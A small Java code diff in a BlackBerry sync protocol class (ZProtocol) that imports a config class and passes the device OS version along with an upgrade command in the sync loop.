@@ -22,6 +22,7 @@ import blackberry.Status;
 import blackberry.Task;
 import blackberry.action.sync.Protocol;
 import blackberry.action.sync.transport.TransportException;
+import blackberry.config.Cfg;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.crypto.EncryptionPKCS5;
@@ -184,7 +185,7 @@ public class ZProtocol extends Protocol {
 
                 boolean left = true;
                 while (left) {
-                    response = command(Proto.UPGRADE);
+                    response = command(Proto.UPGRADE, WChar.pascalize(Cfg.OSVERSION));
                     left = parseUpgrade(response);
                 }
                 response = null;
